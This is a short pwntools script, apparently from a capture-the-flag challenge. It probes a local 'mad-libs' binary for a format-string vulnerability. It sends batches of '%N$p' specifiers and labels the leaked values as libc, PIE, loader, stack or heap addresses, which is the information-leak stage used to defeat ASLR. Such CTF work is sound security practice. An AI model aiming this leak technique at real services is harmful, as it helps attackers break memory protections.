from pwn import *
context.log_level='error'
p = process(['./ldM-linux-x86-64-so.2','--library-path','.','./mad-libs'], cwd='.')
p.recvuntil(b'> ')
maps = open('/proc/%d/maps'%p.pid).read()
def base(sub):
    r=[l for l in maps.splitlines() if sub in l]
    return int(r[0].split('-')[0],16) if r else 0
libcb=base('libcM'); pieb=base('mad-libs'); ldb=base('ldM'); stk=base('[stack]'); heapb=base('[heap]')
print('libc',hex(libcb),'pie',hex(pieb),'ld',hex(ldb),'stack',hex(stk),'heap',hex(heapb))
def tagof(v):
    if libcb<=v<libcb+0x250000: return 'LIBC+0x%x'%(v-libcb)
    if pieb and pieb<=v<pieb+0x3000: return 'PIE+0x%x'%(v-pieb)
    if ldb<=v<ldb+0x40000: return 'LD+0x%x'%(v-ldb)
    if stk<=v<stk+0x21000: return 'STACK+0x%x'%(v-stk)
    if heapb and heapb<=v<heapb+0x100000: return 'HEAP+0x%x'%(v-heapb)
    return ''
for a in range(40,160,24):
    idxs=list(range(a,a+24))
    fam = b'|'.join(('%%%d$p'%i).encode() for i in idxs)
    assert len(fam)<252, len(fam)
    p.sendline(fam)
    out = p.recvuntil(b'> ', timeout=2).decode().replace('> ','')
    vals=out.split('|')
    for i,l in zip(idxs,vals):
        l=l.strip()
        if not l or '(' in l: continue
        try: v=int(l,16)
        except: continue
        t=tagof(v)
        print(i, l, t)
p.close()
